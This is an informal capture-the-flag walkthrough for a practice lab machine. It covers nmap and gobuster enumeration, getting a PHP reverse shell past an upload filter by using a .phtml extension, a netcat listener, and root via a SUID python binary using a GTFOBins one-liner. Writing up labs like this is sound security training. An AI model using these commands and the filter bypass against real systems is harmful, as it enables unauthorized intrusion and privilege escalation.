
#my ip : X.X.X.X
machine : 10.10.236.241

SCANNING
========
intial scan :
└─$ nmap -sV -v -Pn 10.10.236.241  -oN nmap/intial

22/tcp   open     ssh                                                                                                         
80/tcp   open     http       Apache httpd 2.4.29 ((Ubuntu)) 

#it seems we only have the webpage to look into but let's run full scan in the background just in case it is helpless

└─$ nmap -sV -v -Pn -p- -sC 10.10.236.241  -oN nmap/all


ENUMRATION
===========

└─$ gobuster dir -u "http://10.10.236.241/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  | tee gobuster.txt

```
/uploads              (Status: 301) [Size: 316] [--> http://10.10.236.241/uploads/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.236.241/panel/]  

```

#found upload page at /panel so let's try upload a shell !

#pentester monkey php reverse shell is a great one :

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

#let's upload it and check if there is filteration techniques on uploading files 
# it doesn't accecpt php files :)
# let's check /uploads maybe it is uploaded and checked at their side !
#it is not :(
#let's try some modification on extenstion

phtml, .php, .php3, .php4, .php5, and .inc

EXPLOITAION
===========
#trying phtml and changing ip in the code 
# it is uploaded ! , and you can find it in the uploads section !
# set a listener 
$nc -lvp 1234 #my port
and execute it at uploads page 
=============================
   NOW WE HAVE A SHELL !
=============================
as www-data 
#to get stable shell 
$ python3 -c "import pty ; pty.spawn('/bin/bash')"

get user flag :
$find / -name user.txt

now we need privilege escalation :
----------------------------------

sudo -l  #need our passs which we don't know :(
-rw-r--r-- 1 root root 1603 Aug  4  2020 /etc/passwd
-rw-r----- 1 root shadow 1157 Aug  4  2020 /etc/shadow

suid
======
SUID, the special permission for the user access level has a single function: 
A file with SUID always executes as the user who owns the file, regardless of the user passing the command. 

check for suid premissions :
-----------------------------
$find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null

weird file
------------
/usr/bin/python

visiting https://gtfobins.github.io/gtfobins/python/#suid


/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'



now we are root !
# find / -name root.txt

and get the final flag  :) 

